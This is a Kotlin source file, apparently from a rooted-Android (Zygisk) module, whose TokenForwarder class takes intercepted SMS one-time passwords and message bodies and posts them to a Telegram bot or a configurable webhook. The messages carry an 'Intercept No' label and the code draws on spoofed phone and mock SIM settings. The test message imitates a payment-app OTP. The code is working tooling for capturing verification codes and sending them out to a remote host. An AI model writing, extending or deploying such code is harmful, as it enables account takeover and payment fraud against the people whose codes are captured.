package com.hivirtus.zygiskmode

import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject

class TokenForwarder(private val configManager: ConfigManager) {

    private val client = OkHttpClient()

    fun forward(otp: LastOtp): Boolean {
        val config = configManager.load()
        if (!config.autoForwardToken) return false

        val peer = otp.rawPeer.ifBlank { otp.sender }
        val body = otp.body.ifBlank { otp.otp }
        if (!SmsMatcher.shouldForwardToTelegram(config, peer, body)) return false

        val botToken = config.telegramBotToken
        val chatId = config.telegramChatId

        if (botToken.isBlank() || chatId.isBlank()) {
            if (config.forwardUrl.isBlank()) return false
            return forwardWebhook(config.forwardUrl, config.forwardMethod, otp)
        }

        return forwardTelegram(botToken, chatId, otp)
    }

    fun sendTestMessage(): Boolean {
        val config = configManager.load()
        val botToken = config.telegramBotToken
        val chatId = config.telegramChatId
        if (botToken.isBlank() || chatId.isBlank()) return false

        val testId = SmsMatcher.userSenderId(config) ?: "YOUR-SENDER-ID"
        val testOtp = LastOtp(
            otp = "sZ/HWb9+LtFZSOaVeU9+baPVa9X4imd4wq4noAGAFKvKenId/qwYS8IYcuU8OP3XLllboZ/ARatoNaJtWdZ7g==",
            sender = testId,
            body = "sZ/HWb9+LtFZSOaVeU9+baPVa9X4imd4wq4noAGAFKvKenId/qwYS8IYcuU8OP3XLllboZ/ARatoNaJtWdZ7g==",
            phone = testId,
            messageLabel = "YesPay",
            direction = "incoming",
            rawPeer = "AD-YESPRO-S"
        )
        return forwardTelegram(botToken, chatId, testOtp)
    }

    private fun forwardTelegram(botToken: String, chatId: String, otp: LastOtp): Boolean {
        return postTelegram(botToken, chatId, buildZygiskMenuMessage(otp))
    }

    fun buildZygiskMenuMessage(otp: LastOtp): String {
        val config = configManager.load()
        val interceptNo = resolveInterceptLabel(config, otp)
        val tokenBody = otp.body.ifBlank { otp.otp }

        return buildString {
            appendLine("📱 <b>Zygisk Menu</b>")
            appendLine("<b>Mode By @hivirtus @liqdy</b>")
            appendLine("────────────────")
            appendLine("📞 <b>Intercept No:</b> ${escapeHtml(interceptNo)}")
            append(escapeHtml(tokenBody))
        }
    }

    /** Sender ID agar set ho to wahi, warna capture time pe jo save hua */
    private fun resolveInterceptLabel(config: ModuleConfig, otp: LastOtp): String {
        SmsMatcher.userSenderId(config)?.let { return it }
        val label = otp.phone.ifBlank { otp.sender }.trim()
        if (label.isNotBlank()) return label
        return configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }.ifBlank { "INTERCEPT" }
    }

    private fun escapeHtml(text: String): String {
        return text
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
    }

    private fun postTelegram(botToken: String, chatId: String, text: String): Boolean {
        val url = "https://api.telegram.org/bot$botToken/sendMessage"
        val payload = JSONObject()
            .put("chat_id", chatId)
            .put("text", text)
            .put("parse_mode", "HTML")
            .put("disable_web_page_preview", true)
            .toString()
        return postJson(url, payload)
    }

    private fun forwardWebhook(url: String, method: String, otp: LastOtp): Boolean {
        val config = configManager.load()
        val interceptNo = resolveInterceptLabel(config, otp)
        val payload = JSONObject()
            .put("otp", otp.otp)
            .put("token", otp.body.ifBlank { otp.otp })
            .put("intercept_no", interceptNo)
            .put("direction", otp.direction)
            .put("telegram_format", buildZygiskMenuMessage(otp))
            .toString()

        val request = Request.Builder()
            .url(url)
            .method(method.uppercase(), payload.toRequestBody("application/json".toMediaType()))
            .build()

        return try {
            client.newCall(request).execute().use { it.isSuccessful }
        } catch (_: Exception) {
            false
        }
    }

    private fun postJson(url: String, payload: String): Boolean {
        val request = Request.Builder()
            .url(url)
            .post(payload.toRequestBody("application/json".toMediaType()))
            .build()

        return try {
            client.newCall(request).execute().use { it.isSuccessful }
        } catch (_: Exception) {
            false
        }
    }
}
